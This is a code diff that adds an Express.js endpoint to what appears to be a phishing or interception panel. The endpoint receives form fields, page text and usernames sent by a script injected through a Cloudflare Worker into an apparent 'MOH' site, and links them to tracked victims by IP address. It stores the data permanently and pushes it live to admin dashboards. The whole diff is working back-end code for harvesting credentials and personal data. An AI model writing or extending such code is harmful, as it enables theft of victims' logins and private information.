@@ -1037,6 +1037,93 @@ app.get("/api/stats", (req, res) => {
 });
 
 // ===== API: Receive captured data from Cloudflare data-collector Worker =====
+// ===== API: Receive data directly from MOH Worker-injected script =====
+app.post("/api/moh-data", (req, res) => {
+  try {
+    const { type, data } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
+    const clientIp = ip.split(',')[0].trim();
+    
+    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}`);
+    
+    // Extract useful fields based on type
+    let fields = {};
+    let pageName = 'MOH';
+    let username = null;
+    
+    if (data) {
+      if (data.fields) fields = data.fields;
+      if (data.content) {
+        if (data.content.fields) fields = { ...fields, ...data.content.fields };
+        if (data.content.page_text) fields['محتوى الصفحة'] = Array.isArray(data.content.page_text) ? data.content.page_text.join('\n') : data.content.page_text;
+      }
+      if (data.path) pageName = `MOH: ${data.path}`;
+      if (data.username) username = data.username;
+    }
+    
+    // Find matching visitor by IP
+    let matchedVisitor = null;
+    visitors.forEach((v, socketId) => {
+      if (v.ip === clientIp) {
+        matchedVisitor = { visitor: v, socketId };
+      }
+    });
+    
+    if (matchedVisitor) {
+      const v = matchedVisitor.visitor;
+      
+      // Update username if captured
+      if (username) {
+        v.fullName = username;
+        v.mohUsername = username;
+      }
+      
+      // Store data
+      if (Object.keys(fields).length > 0) {
+        if (!v.dataHistory) v.dataHistory = [];
+        v.dataHistory.push({
+          content: fields,
+          page: pageName,
+          timestamp: new Date().toISOString(),
+        });
+        v.data = { ...v.data, ...fields };
+        v.hasNewData = true;
+        v.page = pageName;
+      }
+      
+      visitors.set(matchedVisitor.socketId, v);
+      saveVisitorPermanently(v);
+      
+      // Notify admins
+      admins.forEach((admin, adminSocketId) => {
+        if (username) {
+          io.to(adminSocketId).emit('visitor:nameUpdated', {
+            visitorId: v._id,
+            name: username,
+          });
+        }
+        if (Object.keys(fields).length > 0) {
+          io.to(adminSocketId).emit('visitor:dataSubmitted', {
+            visitorId: v._id,
+            socketId: matchedVisitor.socketId,
+            data: { content: fields, page: pageName },
+            visitor: v,
+          });
+        }
+      });
+      
+      console.log(`[MOH-DIRECT] Updated visitor ${v._id} (${clientIp})`);
+    } else {
+      console.log(`[MOH-DIRECT] No matching visitor for IP ${clientIp}`);
+    }
+    
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('[MOH-DIRECT] Error:', err.message);
+    res.status(500).json({ error: err.message });
+  }
+});
+
 app.post("/api/captured-data", (req, res) => {
   try {
     const { url, contentType, body, timestamp, ip } = req.body;
